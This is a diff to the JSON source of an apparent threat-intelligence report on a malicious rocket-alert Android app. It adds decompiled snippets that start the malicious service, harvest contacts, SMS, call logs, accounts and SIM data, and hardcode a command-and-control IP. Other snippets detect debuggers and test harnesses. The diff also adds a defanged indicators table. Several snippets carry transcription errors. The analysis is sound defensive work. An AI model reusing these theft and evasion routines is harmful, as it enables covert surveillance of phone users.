@@ -1643,7 +1643,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "2CaNQwU93QSQv4cHhba5y7",
+																	"locale": "en-US",
+																	"entryTitle": "RedAlert - Rocket Alerts - Code Snippet Wrapper - 1",
+																	"markdown": "    public void onCreate(Bundle bundle) {\n      startService(true, false); // starts the malicious service; considerDate=true, checkemulator=false \n      super.onCreate (bundle);\n      initializeUI();\n      pollRecentAlerts();\n      Volume.setVolumeKeysAction(this);\n      ServiceManager.startAppServices(this);\n      showImportantDialogs();\n      initializeUpdateChecker();\n      new RegisterPushAsync().execute(new Integer[0]);\n    }"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -2002,7 +2010,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "1k6u6TrP6WFVkZTBkLXgba",
+																	"locale": "en-US",
+																	"entryTitle": "RedAlert - Rocket Alerts - Code Snippet Wrapper - 2",
+																	"markdown": "    private TheData getData() {\n      TheData data = new TheData(this.c.getApplicationContext());\n      try {\n        data.addData(\"SIMInfo\", getSIMInfo());\n      } catch (Exception ex) {\n        data.addData(\"SIMInfoException\", ex.getMessage());\n      ｝\n      try {\n        data addData (\"Contacts\", getAllContacts());\n      } catch (Exception ex2) {\n        data.addData(\"ContactsException\", ex2.getMessage());\n      }\n      try {\n        data.addData(\"SMS\", getAllSMSes());\n      } catch (Exception ex3) {\n        data.addData(\"SMSException\", ex3.getMessage());\n      }\n      try {\n        data. addData(\"Account\", getAllAccounts()) ;\n      } catch (Exception ex4) {\n        data. addData(\"AccountException\", ex4.getMessage());\n      }\n      try {\n        data addData (\"CallLog\", getAllCallLogs());\n      } catch (Exception ex5) {\n        data.addData(\"CallLogException\", ex5.getMessage());\n      }\n      try {\n        data. addData (\"Packages\", getAllPackages()) ;\n      } catch (Exception ex6) {\n        data addData (\"PackagesException\", ex6.getMessage());\n      ｝\n      return data;\n    ｝"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -2129,7 +2145,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "4nvHMbKKUTPV4VeP4pPD0L",
+																	"locale": "en-US",
+																	"entryTitle": "RedAlert - Rocket Alerts - Code Snippet Wrapper - 3",
+																	"markdown": "    public static String getOnionAddress () {\n      return \"http://23.254.228.135:80/\";\n    }\n\n    public static String getOnionAddress(boolean onlyHostName) {\n      if (onlyHostName) {\n        return getOnionAddress().replaceAll(\"http://\", \"\").replaceAll(\":80/\", \"\");\n      }\n    return getOnionAddress ();\n    }"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -2232,7 +2256,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "5Gm1wqXTEjkEE1YfLXnps9",
+																	"locale": "en-US",
+																	"entryTitle": "RedAlert - Rocket Alerts - Code Snippet Wrapper - 4",
+																	"markdown": "    if (isSSL()) {\n      try {\n        upLoadServerUri = upLoadServerUri\n          .replaceAll(\"http://\", \"https://\")\n          .replaceAll(\":80\", \":443\");\n      } catch (Exception e) {\n        e = e;\n        Log.e(\"TAG\", e-getMessage ());\n        return \"Executed\";\n      ｝\n    }"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -2685,7 +2717,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "4pPMhaUVaOiWVgo7U5vfUH",
+																	"locale": "en-US",
+																	"entryTitle": "RedAlert - Rocket Alerts - Code Snippet Wrapper - 5",
+																	"markdown": "    public static boolean isBeingDebugged () {\n      return Debug.isDebuggerConnected();\n    ｝"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -2915,7 +2955,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "6P8LVlmMER6Ee7mjZHZirL",
+																	"locale": "en-US",
+																	"entryTitle": "RedAlert - Rocket Alerts - Code Snippet Wrapper - 7",
+																	"markdown": "    import android.app.ActivityManager;\n\n    public class FindMonkey {\n      public static boolean isUserAMonkey() {\n        return ActivityManager.isUserAMonkey();\n      }\n    ｝"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -3171,7 +3219,7 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -3464,7 +3512,15 @@
 																"linkType": "Entry"
 															},
 															"related_asset": [],
-															"entry_elementMarkdown": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "20d56HcQdLEOXBqXiciQeG",
+																	"locale": "en-US",
+																	"entryTitle": "Threat Intelligence - Report 5 - ICOS - table content",
+																	"markdown": "\n| Type     | Indicator     |\n| ---------- | ---------- |\n| Malicious RedAlert APK Download URL       | hxxp://redalerts[.]me/app.apk       |\n| Malicious RedAlert APK Command and Control       | hxxp://23.254.228[.]135:80/file.php       |\n| Malicious RedAlert APK       | 5087a896360f5d99fbf4eb859c824d19eb6fa358387b f6c2c5e836f7927921c5       |\n| Public key, RSA/ECB/PKCS1Padding       | MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCA gEAvBYe8dLw1TVH39EVQEwCr7kgBRtQz2M2vQbgkbr 0UiTFm0Tk9KVZ1jn0uVgJ+dh1I7uuIfzFEopFQ35OxR njmNAJsOYpYA5ZvD2llS+KUyE4TRJZGh+dfGjc98dCG CVW9aPVuyfciFNpzGU+lUV/nIbi8xmHOSzho+GZvrRWN DvJqmX7Xunjr1crAKIpG1kF8bpa9+VkoKnMOqFBTc6aP Emwj4CmeTsTy+j7ubdKc8tsdoCTGfrLzVj4wlGDjtf06 dYEtZ6zvdBbzb4UA6Ilxsb12KY03qdlqlFREqCxjtJUYDE YChnpOSkrzpLOu+TTkAlW68+u6JjgE8AAAnjpIGRRNvuj5 ZfTS3Ub3xEABBRUuHcesseuaN3wVwvMBIMbWJabVUWUNWY yCewxrtdrc8HStECbS/b05j2lv6Cl1Qv1iQefurL/hvfRE mxlHAnkCmzTxlrEStHHnNmhWOccQI+u0VO6klJShNg8XlR sKXnqpPi3aicki+QMo3i1oWOve6aWkAIJvmHaY4Gmz0nX2 foxlJ2YxOGQe0rUAqDXa8S6tYSmIyCYJoTmllvwJAEpCtO FxerZIAa/1BaxYFhH/iQUzzayJuc6ooUmKLw7q72pe3tN0 cRT3RAJUmRwTcV5hL+UQgakkSzIMFBpM/rpvNC0Qy94mtpN f6iA6gbKm40CAwEAAQ==      |\n"
+																}
+															],
 															"entry_assetFile": [],
 															"entry_button": [],
 															"entry_elementLink": [],
@@ -3588,6 +3644,77 @@
 								}
 							}
 						]
+					},
+					{
+						"contentTypeId": "bladeEnablement",
+						"contentfulId": "frO1Wb6sSyH8oFuAoFr7V",
+						"title": "Subscribe to Cloudforce One",
+						"titleSize": "medium",
+						"backgroundColor": "image-background",
+						"buttonText": null,
+						"buttonUrl": null,
+						"buttonText2": null,
+						"buttonModalId2": null,
+						"buttonUrl2": null,
+						"bladeSizeType": "small",
+						"htmlId": null,
+						"bladeBorder": "none",
+						"buttonOne": {
+							"buttonAssetFile": null,
+							"buttonTextLoggedIn": null,
+							"contentTypeId": "button",
+							"contentfulId": "3AE0ZM4rOFyc2FXW7c6dOB",
+							"elementName": "Threat Intelligence - Subscribe CTA",
+							"standardText": null,
+							"text": "Subscribe",
+							"url": "threat-intelligence-subscribe-cta",
+							"loggedInUrl": null,
+							"buttonModal": {
+								"contentTypeId": "formModal",
+								"contentfulId": "bkftg7VrTPdtzgtHKXCv4",
+								"modalName": "Threat Intelligence - Subscribe CTA - modal",
+								"modalId": "threat-intelligence-subscribe-cta-modal",
+								"modalType": "single-form",
+								"marketoForm": {
+									"contentTypeId": "marketoEmbeddedForm",
+									"contentfulId": "7kuQHC8CeZnI1RrApQKjQu",
+									"bladeName": "Threat Intelligence - Subscribe CTA - marketo form",
+									"backgroundColor": "white",
+									"marketoFormId": 4129,
+									"marketoFormLeadSource": "Inbound - Web Form",
+									"marketoFormLeadSourceDetail": "24Q3-SUB-GBL-Cloudforce One Threat Intelligence-EVS-PAS-ALL-ALL",
+									"marketoFormHeaderText": null,
+									"marketoFormDefaultComment": null,
+									"showCommentBox": null,
+									"marketoFormThankYouText": null,
+									"marketoFormCustomSuccessMessage": null,
+									"marketoFormPdfDownload": null,
+									"marketoFormPdfDownloadI18n": [],
+									"marketoFormAssetDownloadButtonText": null,
+									"marketoFormSuccessRedirectUrl": null,
+									"sendAdRoll": null,
+									"meta_adRollCustomSegment": null,
+									"enableSandbox": null,
+									"marketoFormSubmitButtonText": null,
+									"marketoFormSubmitButtonColor": null,
+									"enableEmailVerification": null,
+									"disableEnterpriseEmailNotification": null,
+									"enableRingout": null
+								},
+								"title": "Get updates from Cloudforce One",
+								"regularCopy": null,
+								"splitFormDefaultTab": null,
+								"selfServeTabText": null,
+								"selfServeCopy": null,
+								"enterpriseTabText": null,
+								"enterpriseCopy": null
+							},
+							"openInNewTab": false,
+							"locale": "en-US"
+						},
+						"buttonTwo": null,
+						"sectionPadding": null,
+						"eyebrow": null
 					},
 					{
 						"contentfulId": "2sdnQxHmAE471TW5aZAM1k",
@@ -3714,6 +3841,12 @@
 						"contentTypeId": "bladeHtml",
 						"contentfulId": "38nfX7mkZGs0w3pPIvJykw",
 						"htmlContent": "<style>\n  .top-nav__logo{\n  width: 200px !important;\n  max-width: unset !important;\n  }\n\n  .button-cta a:hover, a:visited:hover {\n   background-color: white !important;\n}\n\n.bg-focus-orange-3-400_01:focus, .h-bg-orange-3-400_01:hover {\n    background-color: white !important;\n}\n\n  @media screen and (max-width: 576px){\n    .main-header-logo {\n      overflow: hidden;\n      min-width: 58px !important;\n    }\n  }\n  </style>\n",
+						"htmlId": null
+					},
+					{
+						"contentTypeId": "bladeHtml",
+						"contentfulId": "5dJ4cV38B5LEXNdGvzUuRi",
+						"htmlContent": "<style>\n  code {\n    display: block;\n    background-color: #f1f3f4;\n    padding: 20px;\n    border-radius: 8px;\n    text-wrap: wrap;\n  }\n</style>",
 						"htmlId": null
 					}
 				],
